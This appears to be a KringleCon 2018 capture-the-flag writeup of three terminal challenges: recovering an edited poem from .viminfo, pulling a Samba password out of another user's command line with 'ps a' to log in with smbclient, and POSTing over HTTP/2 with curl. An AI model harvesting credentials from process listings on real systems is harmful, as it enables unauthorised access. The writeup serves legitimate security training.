Please do your best to determine what's real.
Has this jamoke, for this elf, got some feels?
Lethal forensics ain't my cup of tea;
If YOU can fake it, my hero you'll be.

One more quick note that might help you complete,
Clearing this mess up that's now at your feet.
Certain text editors can leave some clue.
Did our young Romeo leave one for you?

- Tangle Coalbox, ER Investigator

  Find the first name of the elf of whom a love poem 
  was written.  Complete this challenge by submitting 
  that name to runtoanswer.
</pre>
</div>
</div>
<div id="outline-container-orgd226ba9" class="outline-4">
<h4 id="orgd226ba9">Solution</h4>
<div class="outline-text-4" id="text-orgd226ba9">
<p>
<asciinema-player src="casts/viminfo.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
This one seems pretty straightforward. We have a single hint, and
the hint only discusses the importance of the <code>.viminfo</code>
file. Let's take a look at that, but before we do anything, we
want to do two things: Look at the metadata, and copy the file so
that we don't accidentally modify it (by opening vim, say):
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@viminfo:~$ stat .viminfo &gt; .viminfo_metadata
elf@viminfo:~$ cp .viminfo .viminfo.original
elf@viminfo:~$ cat .viminfo_metadata 
  File: .viminfo
  Size: 5063            Blocks: 16         IO Block: 4096   regular file
Device: 801h/2049d      Inode: 424344      Links: 1
Access: (0644/-rw-r--r--)  Uid: ( 1000/     elf)   Gid: ( 1000/     elf)
Access: 2018-12-14 16:13:20.000000000 +0000
Modify: 2018-12-14 16:13:20.000000000 +0000
Change: 2018-12-16 00:28:58.687164035 +0000
Birth: -    
</pre>
</div>

<p>
To start, we need to figure out what love poem was written. The
"Forensic Relevance of Vim Artifacts" web page has this to say:
</p>

<blockquote>
<p>
File marks are among the last items in most .viminfo files and
essentially consist of a list of files that have been opened with
Vim. A ‘mark’ allows a user to record their location in a file
they were editing, like a bookmark of sorts, which they can jump
back to. On Linux systems, the “History of marks within files”
section of .viminfo records the last 20 files that were opened
using the Vim editor, along with their file path (relative to the
user) and epoch timestamp.
</p>
</blockquote>

<p>
As we view the <code>.viminfo.original</code> file, it's fairly obvious that only one file was recently opened:
</p>

<pre class="example">
# History of marks within files (newest to oldest):
&gt; ~/.secrets/her/poem.txt
	*       1536607217      0
	"       34      2
	^       24      57
	.       20      0
    ...
</pre>

<p>
Opening up <code>~./secrets/her/poem.txt</code>:
</p>

<p class="verse">
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,<br />
Shining many a beautiful sleighbell bearing cheer and sound so pure&#x2013;<br />
&#xa0;&#xa0;There he cleaned them, nearly napping, suddenly there came a tapping,<br />
As of someone gently rapping, rapping at the sleigh house door.<br />
"'Tis some caroler," he muttered, "tapping at my sleigh house door&#x2013;<br />
&#xa0;&#xa0;Only this and nothing more."<br />
<br />
Then, continued with more vigor, came the sound he didn't figure,<br />
Could belong to one so lovely, walking 'bout the North Pole grounds.<br />
&#xa0;&#xa0;But the truth is, she WAS knocking, 'cause with him she would be talking,<br />
Off with fingers interlocking, strolling out with love newfound?<br />
Gazing into eyes so deeply, caring not who sees their rounds.<br />
&#xa0;&#xa0;Oh, 'twould make his heart resound!<br />
<br />
Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.<br />
Floating over, more than walking, moving toward the sound still knocking,<br />
&#xa0;&#xa0;Pausing at the elf-length mirror, checked himself to study clearer,<br />
Fixing hair and looking nearer, what a hunky elf - not shocking!<br />
Peering through the peephole smiling, reaching forward and unlocking:<br />
&#xa0;&#xa0;NEVERMORE in tinsel stocking!<br />
<br />
Greeting her with smile dashing, pearly-white incisors flashing,<br />
Telling jokes to keep her laughing, soaring high upon the tidings,<br />
&#xa0;&#xa0;Of good fortune fates had borne him.  Offered her his dexter forelimb,<br />
Never was his future less dim!  Should he now consider gliding&#x2013;<br />
No - they shouldn't but consider taking flight in sleigh and riding<br />
&#xa0;&#xa0;Up above the Pole abiding?<br />
<br />
Smile, she did, when he suggested that their future surely rested,<br />
Up in flight above their cohort flying high like ne'er before!<br />
&#xa0;&#xa0;So he harnessed two young reindeer, bold and fresh and bearing no fear.<br />
In they jumped and seated so near, off they flew - broke through the door!<br />
Up and up climbed team and humor, Morcel being so adored,<br />
&#xa0;&#xa0;By his lovely NEVERMORE!<br />
<br />
-Morcel Nougat<br />
</p>

<p>
<code>NEVERMORE</code> seems like an odd name for an elf, and submitting this to <code>runtoanswer</code> yields:
</p>

<pre class="example">
Who was the poem written about? NEVERMORE
Sorry, I don't think that's what the forensic data shows.
</pre>

<p>
Returning to our <code>.viminfo</code> file, we see:
</p>

<pre class="example">
# Last Substitute Search Pattern:
~MSle0~&amp;Elinore

# Last Substitute String:
$NEVERMORE

# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
</pre>

<p>
It seems like our elf did a find-and-replace on "Elinore," replacing all instances with "NEVERMORE."
</p>

<pre class="example">
elf@viminfo:~$ ./runtoanswer

Loading, please wait......

Who was the poem written about? Elinore

WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''       
WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....       
WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...        
WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.       
WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.           
WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;       
WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............                               
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 

Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.

-Tangle Coalbox
-ER Investigator

Congratulations!
</pre>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
Elinore
</p>

</div>

<p>
We actually see a bit more history in the <code>.viminfo</code> file:
</p>

<pre class="example">
elf@viminfo:~$ grep '/g' .viminfo.original 
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:s/God/fates/gc
|2,0,1536606833,,"s/God/fates/gc"
:%s/studied/looking/g
|2,0,1536602549,,"%s/studied/looking/g"
:%s/sound/tenor/g
|2,0,1536600579,,"%s/sound/tenor/g"
</pre>

<p>
We can use <code>sed</code> to reverse some of these changes. Though, if we
replace "tenor" with "sound," to undo the earliest change, we have
no way of knowing which instances of "tenor" were there
originally:
</p>

<p>
<code>sed -e 's/tenor/sound/g' -e 's/looking/studied/g' -e 's/fates/God/gi' -e 's/NEVERMORE/Elinore/g' .secrets/her/poem.txt</code>
</p>

<p>
And we recover the following poem:
</p>

<p class="verse">
Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,<br />
Shining many a beautiful sleighbell bearing cheer and sound so pure&#x2013;<br />
&#xa0;&#xa0;There he cleaned them, nearly napping, suddenly there came a tapping,<br />
As of someone gently rapping, rapping at the sleigh house door.<br />
"'Tis some caroler," he muttered, "tapping at my sleigh house door&#x2013;<br />
&#xa0;&#xa0;Only this and nothing more."<br />
<br />
Then, continued with more vigor, came the sound he didn't figure,<br />
Could belong to one so lovely, walking 'bout the North Pole grounds.<br />
&#xa0;&#xa0;But the truth is, she WAS knocking, 'cause with him she would be talking,<br />
Off with fingers interlocking, strolling out with love newfound?<br />
Gazing into eyes so deeply, caring not who sees their rounds.<br />
&#xa0;&#xa0;Oh, 'twould make his heart resound!<br />
<br />
Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.<br />
Floating over, more than walking, moving toward the sound still knocking,<br />
&#xa0;&#xa0;Pausing at the elf-length mirror, checked himself to study clearer,<br />
Fixing hair and studied nearer, what a hunky elf - not shocking!<br />
Peering through the peephole smiling, reaching forward and unlocking:<br />
&#xa0;&#xa0;Elinore in tinsel stocking!<br />
<br />
Greeting her with smile dashing, pearly-white incisors flashing,<br />
Telling jokes to keep her laughing, soaring high upon the tidings,<br />
&#xa0;&#xa0;Of good fortune God had borne him.  Offered her his dexter forelimb,<br />
Never was his future less dim!  Should he now consider gliding&#x2013;<br />
No - they shouldn't but consider taking flight in sleigh and riding<br />
&#xa0;&#xa0;Up above the Pole abiding?<br />
<br />
Smile, she did, when he suggested that their future surely rested,<br />
Up in flight above their cohort flying high like ne'er before!<br />
&#xa0;&#xa0;So he harnessed two young reindeer, bold and fresh and bearing no fear.<br />
In they jumped and seated so near, off they flew - broke through the door!<br />
Up and up climbed team and humor, Morcel being so adored,<br />
&#xa0;&#xa0;By his lovely Elinore!<br />
<br />
-Morcel Nougat<br />
</p>
</div>
</div>
<div id="outline-container-orgd8b4999" class="outline-4">
<h4 id="orgd8b4999">Summary</h4>
<div class="outline-text-4" id="text-orgd8b4999">
<p>
For this terminal, the hint was a big help. By looking at the
<code>.viminfo</code> file, we could reconstruct the changes made to the
file, and learned that someone had replaced Elinore's name with
NEVERMORE.
</p>
</div>
</div>
</div>
<div id="outline-container-orgc6cdd1e" class="outline-3">
<h3 id="plaintext-creds"><a id="orgc6cdd1e"></a>Samba Mucking Report</h3>
<div class="outline-text-3" id="text-plaintext-creds">
<div id="text-table-of-contents">
<ul>
<li><a href="#orgd90f1ef">Goal</a></li>
<li><a href="#orgff1ce22">Background</a></li>
<li><a href="#orgdda3d3d">Intro</a></li>
<li><a href="#orgd21a8f6">Solution</a></li>
<li><a href="#orgec7ee6b">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-orgd90f1ef" class="outline-4">
<h4 id="orgd90f1ef">Goal</h4>
<div class="outline-text-4" id="text-orgd90f1ef">
<div class="note">
<p>
Complete this challenge by uploading the elf's report.txt
file to the samba share at <code>//localhost/report-upload/</code>.
</p>

</div>
</div>
</div>
<div id="outline-container-orgff1ce22" class="outline-4">
<h4 id="orgff1ce22">Background</h4>
<div class="outline-text-4" id="text-orgff1ce22">
</div>
<ul class="org-ul">
<li><a id="org78e89c3"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org78e89c3">
<p>
Wunorse tells us:
</p>

<blockquote>
<p>
What was that password?
</p>

<p>
Golly, passwords may be the end of all of us. Good guys can't remember them, and bad guess can guess them!
</p>

<p>
I've got to upload my chore report to my manager's inbox, but I can't remember my password.
</p>

<p>
Still, with all the automated tasks we use, I'll bet there's a way to find it in memory&#x2026;
</p>
</blockquote>
</div>
</li>
<li><a id="org5300b9a"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org5300b9a">
<p>
Talking to Wunorse unlocks the following hint in our badge: <a href="https://blog.rackspace.com/passwords-on-the-command-line-visible-to-ps">Keeping Command Line Passwords Out of PS</a>
</p>
</div>
</li>
<li><a id="org1c9d508"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-org1c9d508">
<p>
None
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-orgdda3d3d" class="outline-4">
<h4 id="orgdda3d3d">Intro</h4>
<div class="outline-text-4" id="text-orgdda3d3d">
<p>
Opening the terminal, we're greeted with:
</p>

<pre class="example">
Thank you Madam or Sir for the help that you bring!
I was wondering how I might rescue my day.
Finished mucking out stalls of those pulling the sleigh,
My report is now due or my KRINGLE's in a sling!

There's a samba share here on this terminal screen.
What I normally do is to upload the file,
With our network credentials (we've shared for a while).
When I try to remember, my memory's clean!

Be it last night's nog bender or just lack of rest,
For the life of me I can't send in my report.
Could there be buried hints or some way to contort,
Gaining access - oh please now do give it your best!

-Wunorse Openslae


Complete this challenge by uploading the elf's report.txt
file to the samba share at //localhost/report-upload/
</pre>
</div>
</div>

<div id="outline-container-orgd21a8f6" class="outline-4">
<h4 id="orgd21a8f6">Solution</h4>
<div class="outline-text-4" id="text-orgd21a8f6">
<p>
<asciinema-player src="casts/plaintext-creds.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
The hint links us to a page that discusses risks when passwords
are passed on the command line, such as being able to view it with
the process status command <code>ps</code>. Let's try it:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@plaintext-creds:~$ ps
PID TTY          TIME CMD
19 pts/0    00:00:00 bash
73 pts/0    00:00:00 ps
</pre>
</div>

<p>
Not a whole lot of information. By default, <code>ps</code> only shows us a
couple of fields, and only for processes we own (and our
associated with our current terminal). We can read <code>ps</code>'s manual page with <code>man ps</code>, which has the following snippet:
</p>

<pre class="example">
SIMPLE PROCESS SELECTION
   a      Lift the BSD-style "only yourself" restriction...
</pre>

<p>
Let's try it:
</p>

<pre class="example">
elf@plaintext-creds:~$ ps a
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   10 pts/0    S      0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special -
   11 pts/0    S      0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
   15 pts/0    S      0:00 /usr/bin/python /home/manager/report-check.py
   16 pts/0    S      0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppr
   18 pts/0    S      0:00 sudo -u elf /bin/bash
   19 pts/0    S      0:00 /bin/bash
  117 pts/0    S      0:00 sleep 60
  135 pts/0    R+     0:00 ps a
</pre>

<p>
That looks better. We can see there's a <code>samba-wrapper.sh</code>
process, and a <code>report-check.py</code> process. The <code>samba-wrapper</code>
process is particularly interesting, as it seems to have a bunch
of command-line arguments. However, by default, <code>ps</code> truncates
them to the width of our terminal. Simple solution: zoom out our
browser window.
</p>

<pre class="example">
elf@plaintext-creds:~$ ps a
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   10 pts/0    S      0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
   11 pts/0    S      0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
   15 pts/0    S      0:00 /usr/bin/python /home/manager/report-check.py
   16 pts/0    S      0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
   18 pts/0    S      0:00 sudo -u elf /bin/bash
   19 pts/0    S      0:00 /bin/bash
  137 pts/0    S      0:00 sleep 60
  140 pts/0    R+     0:00 ps a
</pre>

<p>
The end of the command is <code>//localhost/report-upload/ directreindeerflatterystable -U report-upload</code>. A less hacky solution is to use more <code>ps</code> arguments to see the entire command:
</p>

<blockquote>
<p>
OUTPUT MODIFIERS
&#x2026;
&#x2013;cols n
	Set screen width.
</p>
</blockquote>

<pre class="example">
elf@plaintext-creds:~$ ps a --columns 500  
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   10 pts/0    S      0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppr
ess //localhost/report-upload/ directreindeerflatterystable -U report-upload
...
</pre>

<p>
At this point, we suspect that "directreindeerflatterystable" is our password. Now we need to figure out how to copy it to the <code>//localhost/report-upload/</code> SMB share. Some Googling points us to the <code>smbclient</code> command:
</p>

<pre class="example">
elf@plaintext-creds:~$ smbclient -h
Usage: smbclient ... [-U|--user=USERNAME] ... service &lt;password&gt;
</pre>

<p>
<code>smbclient</code> has a lot of options, but as we parse the usage information, it seems like the snippet recoverd from the end of <code>samba-wrapper.sh</code> should just work:
</p>

<pre class="example">
elf@plaintext-creds:~$ smbclient //localhost/report-upload/ directreindeerflatterystable -U report-upload
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
smb: \&gt; pwd
Current directory is \\localhost\report-upload\
</pre>

<p>
Uploading the report is as simple as:
</p>

<pre class="example">
smb: \&gt; put report.txt
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
</pre>

<p>
Once we do so, the following happens:
</p>

<pre class="example">
smb: \&gt; Terminated
elf@plaintext-creds:~$ 

			       .;;;;;;;;;;;;;;;'                               
			     ,NWOkkkkkkkkkkkkkkNN;                             
			   ..KM; Stall Mucking ,MN..                           
			 OMNXNMd.             .oMWXXM0.                        
			;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
			:MO                         xMl             '.         
			:MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
			:MO  .ONNNNNNNNXk           xMl             :lc'       
			:MO   dOOOOOOOOOo           xMl             ;.         
			:MO   'cccccccccccccc:'     xMl                        
			:MO  .WMMMMMMMMMMMMMMMW.    xMl                        
			:MO    ...............      xMl                        
			.NWxddddddddddddddddddddddddNW'                        
			  ;ccccccccccccccccccccccccc;                          

You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae    
</pre>
</div>
</div>
<div id="outline-container-orgec7ee6b" class="outline-4">
<h4 id="orgec7ee6b">Summary</h4>
<div class="outline-text-4" id="text-orgec7ee6b">
<p>
We ran <code>ps</code>, with some extra arguments to see all of the command-line arguments, and recovered the username and password for the SMB share. We then copied the report to the share with <code>smbclient</code>.
</p>
</div>
</div>
</div>
<div id="outline-container-org589ac73" class="outline-3">
<h3 id="http2"><a id="org589ac73"></a>HTTP2 CURLing Master</h3>
<div class="outline-text-3" id="text-http2">
<div id="text-table-of-contents">
<ul>
<li><a href="#org479ffe7">Goal</a></li>
<li><a href="#org6ff0dab">Background</a></li>
<li><a href="#orga38c38c">Intro</a></li>
<li><a href="#org8dfe592">Solution</a></li>
<li><a href="#orgddc6252">Alternative solution</a></li>
<li><a href="#orgde1e300">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-org479ffe7" class="outline-4">
<h4 id="org479ffe7">Goal</h4>
<div class="outline-text-4" id="text-org479ffe7">
<div class="note">
<p>
Complete this challenge by submitting the right HTTP request to the
server at <a href="http://localhost:8080/">http://localhost:8080/</a> to get the candy striper started
again.
</p>

</div>
</div>
</div>
<div id="outline-container-org6ff0dab" class="outline-4">
<h4 id="org6ff0dab">Background</h4>
<div class="outline-text-4" id="text-org6ff0dab">
</div>
<ul class="org-ul">
<li><a id="orgb63986e"></a>Elf Chat<br />
<div class="outline-text-5" id="text-orgb63986e">
<p>
Holly has the following plight:
</p>

<blockquote>
<p>
Oh that Bushy!
</p>

<p>
Sorry to vent, but that brother of mine did something strange.
</p>

<p>
The trigger to restart the Candy Striper is apparently an arcane HTTP call or 2.
</p>

<p>
I sometimes wonder if all IT folk do strange things with their home networks&#x2026;
</p>
</blockquote>
</div>
</li>
<li><a id="orgbc3c828"></a>Badge Hint<br />
<div class="outline-text-5" id="text-orgbc3c828">
<p>
Holly links us to: <a href="https://developers.google.com/web/fundamentals/performance/http2/">HTTP/2.0 Basics</a>
</p>
</div>
</li>
<li><a id="orgc5b6d02"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-orgc5b6d02">
<p>
<a href="https://www.youtube.com/watch?v=PC6-mn9g9Cs">Chris Elgee, HTTP/2: Because 1 Is the Loneliest Number</a>
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-orga38c38c" class="outline-4">
<h4 id="orga38c38c">Intro</h4>
<div class="outline-text-4" id="text-orga38c38c">
<p>
Once we open the terminal, we see a curling stone and the following message:
</p>

<pre class="example">
I am Holly Evergreen, and now you won't believe:
Once again the striper stopped; I think I might just leave!
Bushy set it up to start upon a website call.
Darned if I can CURL it on - my Linux skills apall.

Could you be our CURLing master - fixing up this mess?
If you are, there's one concern you surely must address.
Something's off about the conf that Bushy put in place.
Can you overcome this snag and save us all some face?

  Complete this challenge by submitting the right HTTP 
  request to the server at http://localhost:8080/ to 
  get the candy striper started again. You may view 
  the contents of the nginx.conf file in 
  /etc/nginx/, if helpful.    
</pre>
</div>
</div>
<div id="outline-container-org8dfe592" class="outline-4">
<h4 id="org8dfe592">Solution</h4>
<div class="outline-text-4" id="text-org8dfe592">
<p>
<asciinema-player src="casts/http2.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
The terminal tells us to check out <code>/etc/nginx/nginx.conf</code>, so we
do that. The following comment catches our attention:
</p>

<pre class="example">
server {
# love using the new stuff! -Bushy
    listen                  8080 http2;
    # server_name           localhost 127.0.0.1;
    root /var/www/html;
</pre>

<p>
The web server has HTTP2 enabled. We read the page that Holly
linked us to, but what we're really looking for is how to use the
<code>curl</code> command with HTTP2. Chris Elgee's video gives us the following
command, which we've adapted for our server running on localhost,
port 8080:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@http2:~$ curl -v --http2 http://localhost:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (<span style="color: #b22222;">#</span><span style="color: #b22222;">0)</span>
&gt; GET / HTTP/1.1
&gt; Host: localhost:8080
&gt; User-Agent: curl/7.52.1
&gt; Accept: */*
&gt; Connection: Upgrade, HTTP2-Settings
&gt; Upgrade: h2c
&gt; HTTP2-Settings: AAMAAABkAARAAAAA
&gt; 
* Curl_http_done: called <span style="color: #a0522d;">premature</span> == 0
</pre>
</div>

<p>
Well, that didn't work. Let's try to find out more about the <code>--http2</code> flag. We can run <code>curl --help</code>, and see:
</p>

<pre class="example">
--http2                  Use HTTP 2 (H)
--http2-prior-knowledge  Use HTTP 2 without HTTP/1.1 Upgrade (H)
</pre>

<p>
Let's try doing it without the HTTP/1.1 upgrade:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@http2:~$ curl -v --http2-prior-knowledge http://localhost:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (<span style="color: #b22222;">#</span><span style="color: #b22222;">0)</span>
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data<span style="color: #a020f0;"> in</span> stream buffer to connection buffer after upgrade: <span style="color: #a0522d;">len</span>=0
* Using Stream ID: 1 (easy handle 0x55e0a5cbedc0)
&gt; GET / HTTP/1.1
&gt; Host: localhost:8080
&gt; User-Agent: curl/7.52.1
&gt; Accept: */*
&gt; 
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
&lt; HTTP/2 200 
&lt; server: nginx/1.10.3
&lt; date: Sat, 12 Jan 2019 21:06:41 GMT
&lt; content-type: text/html; <span style="color: #a0522d;">charset</span>=UTF-8
&lt; 
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Candy Striper Turner-On<span style="color: #8b2252;">'er&lt;/title&gt;</span>
<span style="color: #8b2252;"> &lt;/head&gt;</span>
<span style="color: #8b2252;"> &lt;body&gt;</span>
<span style="color: #8b2252;"> &lt;p&gt;To turn the machine on, simply POST to this URL with parameter "status=on"</span>

<span style="color: #8b2252;"> &lt;/body&gt;</span>
<span style="color: #8b2252;">&lt;/html&gt;</span>
<span style="color: #8b2252;">* Curl_http_done: called premature == 0</span>
<span style="color: #8b2252;">* Connection #0 to host localhost left intact</span>
</pre>
</div>

<p>
Ok! Now, instead of sending an empty GET, we need to send a POST with the right paramter. Once again, we'll return to the help output:
</p>

<pre class="example">
-d, --data DATA HTTP POST data (H)
</pre>

<p>
Easy enough:
</p>

<div class="org-src-container">
<pre class="src src-sh">elf@http2:~$ curl -v --http2-prior-knowledge --data <span style="color: #8b2252;">'status=on'</span> http://localhost:8080/
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (<span style="color: #b22222;">#</span><span style="color: #b22222;">0)</span>
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Copying HTTP/2 data<span style="color: #a020f0;"> in</span> stream buffer to connection buffer after upgrade: <span style="color: #a0522d;">len</span>=0
* Using Stream ID: 1 (easy handle 0x563dc369cdc0)
&gt; POST / HTTP/1.1
&gt; Host: localhost:8080
&gt; User-Agent: curl/7.52.1
&gt; Accept: */*
&gt; Content-Length: 9
&gt; Content-Type: application/x-www-form-urlencoded
&gt; 
* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
* We are completely uploaded and fine
&lt; HTTP/2 200 
&lt; server: nginx/1.10.3
&lt; date: Sat, 12 Jan 2019 21:08:29 GMT
&lt; content-type: text/html; <span style="color: #a0522d;">charset</span>=UTF-8
&lt; 
&lt;html&gt;
 &lt;head&gt;
  &lt;title&gt;Candy Striper Turner-On<span style="color: #8b2252;">'er&lt;/title&gt;</span>
<span style="color: #8b2252;"> &lt;/head&gt;</span>
<span style="color: #8b2252;"> &lt;body&gt;</span>
<span style="color: #8b2252;"> &lt;p&gt;To turn the machine on, simply POST to this URL with parameter "status=on"</span>


<span style="color: #8b2252;">                                                                okkd,          </span>
<span style="color: #8b2252;">                                                               OXXXXX,         </span>
<span style="color: #8b2252;">                                                              oXXXXXXo         </span>
<span style="color: #8b2252;">                                                             ;XXXXXXX;         </span>
<span style="color: #8b2252;">                                                            ;KXXXXXXx          </span>
<span style="color: #8b2252;">                                                           oXXXXXXXO           </span>
<span style="color: #8b2252;">                                                        .lKXXXXXXX0.           </span>
<span style="color: #8b2252;">  ''''''       .''''''       .''''''       .:::;   '</span>:okKXXXXXXXX0Oxcooddool,   
 <span style="color: #8b2252;">'MMMMMO'</span>,,,,,;WMMMMM0<span style="color: #8b2252;">',,,,,;WMMMMMK'</span>,,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
 <span style="color: #8b2252;">'MMMMN;,,,,,'</span>0MMMMMW;,,,,,<span style="color: #8b2252;">'OMMMMMW:,,,,,'</span>kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
 <span style="color: #8b2252;">'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. </span>
<span style="color: #8b2252;"> '</span>MMMO<span style="color: #8b2252;">',,,,,;WMMMMMO'</span>,,,,,,NMMMMMK<span style="color: #8b2252;">',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: </span>
<span style="color: #8b2252;"> '</span>MMN,,,,,,<span style="color: #8b2252;">'OMMMMMW;,,,,,'</span>kMMMMMW;,,,,,<span style="color: #8b2252;">'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  </span>
<span style="color: #8b2252;"> '</span>MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
 <span style="color: #8b2252;">'M0'</span>,,,,,;WMMMMM0<span style="color: #8b2252;">',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  </span>
<span style="color: #8b2252;"> .c.......'</span>cccccc.......<span style="color: #8b2252;">'cccccc.......'</span>cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
                                                       ..,:ccllc:cccccc:<span style="color: #8b2252;">'      </span>


<span style="color: #8b2252;">Unencrypted 2.0? He'</span>s such a silly guy.
That<span style="color: #8b2252;">'s the kind of stunt that makes my OWASP friends all cry.</span>
<span style="color: #8b2252;">Truth be told: most major sites are speaking 2.0;</span>
<span style="color: #8b2252;">TLS connections are in place when they do so.</span>

<span style="color: #8b2252;">-Holly Evergreen</span>
<span style="color: #8b2252;">&lt;p&gt;Congratulations! You'</span>ve won and have successfully completed this challenge.
&lt;p&gt;POSTing data<span style="color: #a020f0;"> in</span> HTTP/2.0.

 &lt;/body&gt;
&lt;/html&gt;
* Curl_http_done: called <span style="color: #a0522d;">premature</span> == 0
* Connection <span style="color: #b22222;">#</span><span style="color: #b22222;">0 to host localhost left intact</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-orgddc6252" class="outline-4">
<h4 id="orgddc6252">Alternative solution</h4>
<div class="outline-text-4" id="text-orgddc6252">
<p>
This system had some interesting commands in the bash history:
</p>
<div class="org-src-container">
<pre class="src src-sh">elf@http2:~$ grep curl .bash_history 
curl --http2-prior-knowledge http://localhost:8080/index.php
</pre>
</div>
</div>
</div>
<div id="outline-container-orgde1e300" class="outline-4">
<h4 id="orgde1e300">Summary</h4>
<div class="outline-text-4" id="text-orgde1e300">
<p>
We found a comment from Bushy in the <code>nginx</code> config, which told us
that HTTP2 was enabled on this system. Using a combination of
Chris Elgee's talk and the curl help output, we figured out the
correct parameters to have curl be able to send the request as
